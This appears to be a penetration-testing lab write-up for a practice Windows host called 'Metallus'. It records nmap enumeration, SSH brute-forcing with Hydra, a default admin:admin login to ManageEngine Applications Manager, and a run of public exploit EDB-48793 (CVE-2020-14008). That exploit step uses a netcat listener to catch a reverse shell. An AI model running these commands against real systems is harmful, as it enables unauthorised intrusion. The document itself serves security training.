# Metallus
## Table of Contents
* [Summary](#summary)
* [Enumerate](#enumerate)
  * [Ports](#ports)
  * [Services](#services)
    * [SSH](#ssh)
    * [RPC](#rpc)
    * [NetBIOS](#netbios)
    * [SMB](#smb)
    * [CCE4X](#cce4x)
    * [HTTP](#http)
  * [OS](#os)
* [Exploit](#exploit)
  * [Password Guessing](#password-guessing) 
    * [Default Credentials](#default-credentials)
    * [Hydra](#hydra)
  * [CVE-2020-14008](#cve-2021-14008) 
    * [EDB-ID-48793](#edb-id-48793)
    * [Metasploit](#metasploit)
* [Explore](#explore)
* [Escalate](#escalate)
* [Lessons Learned](#lessons-learned)

## Summary
* Hostname: metallus
* Description: Point and shoot.
* IP address: 192.168.103.96 
* MAC address: (ref:)
* Domain: 
* TCP Ports and Services
  * 135
  * 139
  * 445
  * 12000
    * cc4ex
  * 22222
    * OpenSSH
  * 40443
    * ManageEngine Application Manager 14
* OS (ref: systeminfo via post-exploitation)
  * Distro: Microsoft Windows 10 Pro
  * Kernel: 10.0.18362 N/A Build 18362
  * Architecture: x64
* Users (ref:)
  * Administrator
* Vulnerabilities and Exploits
  * CVE-2020-14008 (ref: searchsploit)
    * EDB-ID-48793
    * Metasploit
* Tools Used
  * Nmap
* Flag
  * 43dc98347f2578a233dd387acffe2130
* Hints
  * n/a

# Enumerate
```bash
TARGET=10.11.12.13
NAME=metallus
mkdir $NAME
mkdir $NAME/exploits
mkdir $NAME/loot
mkdir $NAME/scans
mkdir $NAME/screenshots
sudo save-screenshots-here $NAME/screenshots
cd $NAME
```

## Ports
```bash
sudo nmap $TARGET -sS -sU --min-rate 1000 -oN scans/$NAME-nmap-initial
sudo nmap $TARGET -sS -sU -p- --min-rate 1000 -oN scans/$NAME-nmap-complete
sudo nmap $TARGET -sV $(print-open-ports-from-nmap-scan scans/$NAME-nmap-complete) -oN scans/$NAME-nmap-versions

Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-27 17:15 EDT
Nmap scan report for 192.168.103.96
Host is up (0.18s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown       Windows Deployment Services
12000/tcp open  cce4x
22222/tcp open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
40443/tcp open  unknown
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  unknown
49796/tcp open  unknown
49797/tcp open  unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
```bash
sudo nmap 192.168.103.96 -sC

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-27 17:52 EDT
Nmap scan report for 192.168.103.96
Host is up (0.13s latency).
Not shown: 996 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
12000/tcp open  cce4x

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-27T21:52:15
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 51.27 seconds
```

## Services
### SSH
```bash
sudo nmap 192.168.103.96 -p22222 --script ssh-brute -oN scans/metallus-nmap-script-ssh-brute

# output
PORT      STATE SERVICE
22222/tcp open  easyengine
| ssh-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 2292 guesses in 601 seconds, average tps: 4.0

Nmap done: 1 IP address (1 host up) scanned in 602.47 seconds
```
```bash
sudo nmap 192.168.103.96 -p22222 --script ssh2-enum-algos -oN scans/metallus-nmap-script-ssh2-enum-algos

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-27 17:31 EDT
Nmap scan report for 192.168.103.96
Host is up (0.12s latency).

PORT      STATE SERVICE
22222/tcp open  easyengine
| ssh2-enum-algos: 
|   kex_algorithms: (10)
|       curve25519-sha256
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group16-sha512
|       diffie-hellman-group18-sha512
|       diffie-hellman-group14-sha256
|       diffie-hellman-group14-sha1
|   server_host_key_algorithms: (5)
|       rsa-sha2-512
|       rsa-sha2-256
|       ssh-rsa
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (6)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
```

### RPC
```bash
rpcclient -U '' $TARGET

# output
Enter WORKGROUP\'s password: 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

### NetBIOS
```bash
nbtscan $TARGET

# output
Doing NBT name scan for addresses from 192.168.103.96

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
```

### SMB
```bash
smbclient -L $TARGET

# output
Enter WORKGROUP\victor's password: 
session setup failed: NT_STATUS_ACCESS_DENIED
```
```bash
smbmap -H $TARGET

# output
NSTR
```
```bash
sudo nmap $TARGET -p445 --script smb-vuln* -oN scans/$NAME-nmap-scripts-smb-vuln*

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-27 17:11 EDT
Nmap scan report for 192.168.103.96
Host is up (0.14s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Nmap done: 1 IP address (1 host up) scanned in 12.20 seconds
```

## OS
```bash
sudo nmap $TARGET -O -oN scans/$NAME-nmap-os

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-27 17:21 EDT
Nmap scan report for 192.168.103.96
Host is up (0.12s latency).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|7 (87%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows XP SP3 (87%), Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.20 seconds
```

# Exploit
## Password Guessing
### Default Credentials
This worked.
```bash
# ManageEngine
# admin:admin
```

### Hydra
This did not work.
```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt -s 22222 ssh://192.168.103.96

# output
NSTR
```

## CVE-2020-14008
### EDB-ID-48793
This worked.
```bash
searchsploit manageengine application manager
mkdir edb-id-48793
cd edb-id-48793
searchsploit -m 48793
pyenv 3.9.5
pip install lxml
# https://linuxconfig.org/how-to-install-java-on-kali-linux
sudo apt install default-jdk
sudo nc -nvlp 443
python 48793.py http://192.168.102.96:40443 admin admin 192.168.49.102 443

# output
[*] Visiting page to retrieve initial cookies...
[*] Retrieving admin cookie...
[*] Getting base directory of ManageEngine...
[*] Found base directory: C:\Program Files\ManageEngine\AppManager14
[*] Creating JAR file...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
added manifest
adding: weblogic/jndi/Environment.class(in = 1844) (out= 1081)(deflated 41%)
[*] Uploading JAR file...
[*] Attempting to upload JAR directly to targeted Weblogic folder...
[!] Failed to upload JAR directly, continue to add and execute job to move JAR...
[*] Creating a task to move the JAR file to relative path: classes/weblogic/version8/...
[*] Found actionname: move_weblogic_jar9869 with found actionid 10000003
[*] Executing created task with id: 10000003 to copy JAR...
[*] Task 10000003 has been executed successfully
[*] Deleting created task as JAR has been copied...
[*] Running the Weblogic credentialtest which triggers the code in the JAR...
[*] Check your shell...
```

# Explore
NSTR

# Escalate
NSTR

# Lessons Learned
* TCP 12000 is used by ClearCommerce Engine 4.x (www.clearcommerce.com) as well as Phantasy Star Universe, CubeForm, Multiplayer SandBox Game.
* TCP 5040 is used by RPC for Windows Deployment Services.
